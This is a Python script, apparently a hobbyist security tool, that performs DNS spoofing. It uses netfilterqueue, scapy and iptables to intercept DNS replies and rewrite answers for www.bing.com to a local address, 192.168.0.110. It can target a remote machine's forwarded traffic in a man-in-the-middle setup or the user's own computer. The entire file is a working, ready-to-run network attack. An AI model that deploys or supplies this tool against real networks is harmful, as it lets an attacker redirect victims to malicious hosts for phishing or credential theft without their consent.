import netfilterqueue
import subprocess
import scapy.all as scapy
import sys

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"

queue = netfilterqueue.NetfilterQueue()

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        if scapy_packet.haslayer(scapy.DNSQR):  # Ensure DNS query exists
            qname = scapy_packet[scapy.DNSQR].qname.decode()
            if "www.bing.com" in qname:
                print(f"{GREEN}[+] Spoofing DNS response for {qname}{RESET}")
                answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.110")
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Delete checksums and lengths for recalculation
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

def execute_spoofing():
    queue.bind(0, process_packet)
    queue.run()

def clear_iptables():
    subprocess.call(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-D", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-D", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])

def main():
    print(f"{CYAN}[+] Welcome to DNS Spoofer.{RESET}")
    print("[+] How would you like to run the DNS Spoofer?")
    print("\t[1] Remote Computer")
    print("\t[2] My Computer")
    print("\t[00] Exit")
    choice = input(f"{CYAN}[!] Enter the number > {RESET}")
    try:
        if choice == "1":
            print(f"[+] Setting up iptables for remote computer")
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
            print(f"{GREEN}[+] DNS spoofing started.{RESET}")
            execute_spoofing()
        elif choice == "2":
            print("[+] Setting up iptables for personal computer")
            subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
            subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
            print(f"{GREEN}[+] DNS spoofing started.{RESET}")
            execute_spoofing()
        elif choice == "00":
            sys.exit()
    except KeyboardInterrupt:
        print(f"\r{RED}[!] CTRL + C detected. Exiting program...{RESET}")
    finally:
        clear_iptables()
        print(f"{GREEN}[+] iptables rules removed successfully.{RESET}")

if __name__ == "__main__":
    main()
